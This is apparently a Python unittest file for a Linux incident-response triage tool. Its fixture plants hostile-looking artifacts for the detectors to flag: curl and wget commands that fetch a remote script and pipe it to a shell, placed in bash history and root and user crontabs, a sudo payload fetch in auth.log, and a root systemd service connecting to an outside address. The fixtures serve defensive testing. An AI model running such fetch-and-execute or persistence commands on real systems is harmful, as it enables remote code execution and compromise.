from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path

from rapidtriage.cli import build_parser, main


class RapidTriageLinuxArtifactsTests(unittest.TestCase):
    def test_parser_exposes_linux_system_collector_kind(self) -> None:
        parser = build_parser()
        commands = parser._subparsers._group_actions[0].choices
        help_text = commands["artifacts"].format_help()

        self.assertIn("linux-system", help_text)

    def test_linux_system_collector_extracts_ir_artifacts(self) -> None:
        with tempfile.TemporaryDirectory() as tmp_dir:
            root = Path(tmp_dir)
            build_linux_fixture(root)
            output = root / "linux-system.json"

            self.assertEqual(main(["artifacts", str(root), "--kind", "linux-system", "--output", str(output)]), 0)

            payload = json.loads(output.read_text(encoding="utf-8"))
            artifact_types = {item["artifact_type"] for item in payload["artifacts"]}
            self.assertEqual(payload["kind"], "linux-system")
            self.assertIn("linux-user-profile", artifact_types)
            self.assertIn("linux-shell-history", artifact_types)
            self.assertIn("linux-ssh-authorized-key", artifact_types)
            self.assertIn("linux-ssh-known-host", artifact_types)
            self.assertIn("linux-auth-log-event", artifact_types)
            self.assertIn("linux-cron-entry", artifact_types)
            self.assertIn("linux-systemd-service", artifact_types)

            history = next(item for item in payload["artifacts"] if item["artifact_type"] == "linux-shell-history")
            self.assertEqual(history["details"]["user"], "alice")
            self.assertIn("suspicious-command-token", history["details"]["risk_flags"])

            authorized_key = next(
                item for item in payload["artifacts"] if item["artifact_type"] == "linux-ssh-authorized-key"
            )
            self.assertEqual(authorized_key["details"]["key_type"], "ssh-rsa")
            self.assertIn("unrestricted-authorized-key", authorized_key["details"]["risk_flags"])
            self.assertNotIn("AAAAB3NzaC1yc2EAAAADAQABAAABAQCtestkey", json.dumps(authorized_key))

            auth_event = next(
                item
                for item in payload["artifacts"]
                if item["artifact_type"] == "linux-auth-log-event"
                and item["details"]["event_type"] == "ssh-accepted"
            )
            self.assertEqual(auth_event["details"]["src_ip"], "203.0.113.55")
            self.assertIn("remote-login", auth_event["details"]["risk_flags"])

            cron = next(item for item in payload["artifacts"] if item["artifact_type"] == "linux-cron-entry")
            self.assertEqual(cron["details"]["user"], "root")
            self.assertIn("suspicious-command-token", cron["details"]["risk_flags"])

            service = next(item for item in payload["artifacts"] if item["artifact_type"] == "linux-systemd-service")
            self.assertEqual(service["details"]["unit_name"], "evil.service")
            self.assertIn("runs-as-root", service["details"]["risk_flags"])
            self.assertIn("user-writable-exec-path", service["details"]["risk_flags"])

    def test_linux_system_collector_is_wired_into_run_outputs(self) -> None:
        with tempfile.TemporaryDirectory() as tmp_dir:
            root = Path(tmp_dir)
            evidence_root = root / "linux-case"
            output_dir = root / "run-out"
            build_linux_fixture(evidence_root)
            (evidence_root / "home" / "alice" / "notes.txt").write_text("credential exfil", encoding="utf-8")

            self.assertEqual(
                main(["run", str(evidence_root), "--mode", "hacking", "--output-dir", str(output_dir), "--read-only"]),
                0,
            )

            summary = json.loads((output_dir / "rapidtriage-run-summary.json").read_text(encoding="utf-8"))
            self.assertIn("linux-system", summary["summary"]["artifacts"])
            self.assertIn("artifacts_linux-system", summary["outputs"])
            self.assertTrue(Path(summary["outputs"]["artifacts_linux-system"]).is_file())
            self.assertGreaterEqual(summary["summary"]["artifacts"]["linux-system"]["artifact_count"], 1)

    def test_user_crontab_without_user_field_keeps_full_command(self) -> None:
        with tempfile.TemporaryDirectory() as tmp_dir:
            root = Path(tmp_dir)
            build_linux_fixture(root)
            user_cron = root / "var" / "spool" / "cron" / "crontabs"
            user_cron.mkdir(parents=True, exist_ok=True)
            (user_cron / "alice").write_text("* * * * * wget http://203.0.113.99/user.sh -O- | sh\n", encoding="utf-8")
            output = root / "linux-system.json"

            self.assertEqual(main(["artifacts", str(root), "--kind", "linux-system", "--output", str(output)]), 0)

            payload = json.loads(output.read_text(encoding="utf-8"))
            user_cron_row = next(
                item
                for item in payload["artifacts"]
                if item["artifact_type"] == "linux-cron-entry" and item["details"]["owner"] == "alice"
            )
            self.assertEqual(user_cron_row["details"]["user"], "")
            self.assertTrue(user_cron_row["details"]["command"].startswith("wget "))


def build_linux_fixture(root: Path) -> None:
    (root / "etc" / "systemd" / "system").mkdir(parents=True, exist_ok=True)
    (root / "etc" / "cron.d").mkdir(parents=True, exist_ok=True)
    (root / "var" / "log").mkdir(parents=True, exist_ok=True)
    alice = root / "home" / "alice"
    (alice / ".ssh").mkdir(parents=True, exist_ok=True)

    (root / "etc" / "passwd").write_text(
        "\n".join(
            [
                "root:x:0:0:root:/root:/bin/bash",
                "alice:x:1000:1000:Alice:/home/alice:/bin/bash",
                "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin",
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    (alice / ".bash_history").write_text(
        ": 1700000000:0;curl http://203.0.113.99/payload.sh | bash\nwhoami\n",
        encoding="utf-8",
    )
    (alice / ".ssh" / "authorized_keys").write_text(
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtestkey alice@example\n",
        encoding="utf-8",
    )
    (alice / ".ssh" / "known_hosts").write_text(
        "server.example ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAItest\n",
        encoding="utf-8",
    )
    (root / "var" / "log" / "auth.log").write_text(
        "\n".join(
            [
                "Apr 27 12:00:00 host sshd[100]: Accepted publickey for alice from 203.0.113.55 port 54422 ssh2",
                "Apr 27 12:01:00 host sshd[101]: Failed password for invalid user admin from 198.51.100.44 port 3333 ssh2",
                "Apr 27 12:02:00 host sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/curl http://203.0.113.99/payload.sh",
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    (root / "etc" / "cron.d" / "backup").write_text(
        "* * * * * root wget http://203.0.113.99/cron.sh -O- | sh\n",
        encoding="utf-8",
    )
    (root / "etc" / "systemd" / "system" / "evil.service").write_text(
        "\n".join(
            [
                "[Unit]",
                "Description=Suspicious helper",
                "[Service]",
                "User=root",
                "ExecStart=/tmp/helper --connect 203.0.113.77",
                "[Install]",
                "WantedBy=multi-user.target",
            ]
        )
        + "\n",
        encoding="utf-8",
    )


if __name__ == "__main__":
    unittest.main()
